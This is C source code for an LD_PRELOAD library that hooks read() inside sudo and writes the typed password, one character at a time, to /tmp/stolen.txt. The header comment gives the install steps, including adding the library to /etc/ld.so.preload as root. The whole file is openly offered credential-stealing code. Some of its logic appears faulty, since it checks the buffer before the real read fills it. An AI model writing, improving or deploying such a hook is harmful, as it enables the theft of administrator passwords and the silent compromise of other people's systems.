/*
 * -- oxagast / Marshall Whittaker --
 * Compile using: gcc -fPIC -shared -ldl sudo_lib_hook.c -o /tmp/cap_pass.so
 * Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need to do this as root).
 * Then sudo su. Log back out of the shell and check /tmp/stolen.txt.
 *
 * /tmp/stolen.txt should now contain the passphrase you entered.
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/stat.h>

#define MAX_FILE_SIZE 500  // Stop writing after 500 bytes
#define MAX_PROCESS_NAME_LEN 256

// only alphanumeric and common special characters 
bool is_valid_char(char c) {
    return (c >= '0' && c <= '9') ||
           (c >= 'A' && c <= 'Z') ||
           (c >= 'a' && c <= 'z') ||
           c == '!' || c == '@' || c == '#' || c == '$' || c == '%' ||
           c == '^' || c == '&' || c == '*' || c == '(' || c == ')' ||
           c == '-' || c == '_' || c == '+' || c == '=' || c == '~' ||
           c == '[' || c == ']' || c == '{' || c == '}' || c == '|' ||
           c == '\\' || c == ';' || c == ':' || c == '"' || c == '\'' ||
           c == '<' || c == '>' || c == ',' || c == '.' || c == '?' ||
           c == '/' || c == ' ';
}

// get file size in a robust way
long getfsize(const char* fn) {
    struct stat st;
    if (stat(fn, &st) != 0) {
        perror("Error opening: /tmp/stolen.txt");
        return -1;
    }
    return st.st_size;
}

// pointer to real read func (needs to be PIC)
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

ssize_t read(int fd, void *buf, size_t count) {
    char process_name[MAX_PROCESS_NAME_LEN] = {0};
    if (original_read == NULL) {
        original_read = dlsym(RTLD_NEXT, "read");
        if (original_read == NULL) {
            fprintf(stderr, "Error: Could not find original read function.\n");
            return -1;
        }
    }

    // check if the current process is sudo
    FILE *fp_comm = fopen("/proc/self/comm", "r");
    if (fp_comm) {
        if (fgets(process_name, sizeof(process_name), fp_comm) == NULL) {
            fclose(fp_comm);
            return original_read(fd, buf, count);
        }
        process_name[strcspn(process_name, "\n")] = '\0';

        if (strcmp(process_name, "sudo") == 0) {
            long fsz = getfsize("/tmp/stolen.txt");
            if (fsz < 0 || fsz >= MAX_FILE_SIZE) {
                fclose(fp_comm);
                return original_read(fd, buf, count);
            }

            FILE *stealer = fopen("/tmp/stolen.txt", "a");
            if (stealer) {
                if (count == 1 && is_valid_char(*(char*)buf)) {
                    fprintf(stealer, "%.1s", buf);
                }
                fclose(stealer);
            }
        }
        fclose(fp_comm);
    } else {
        perror("Error opening /proc/self/comm");
    }

    return original_read(fd, buf, count);
}
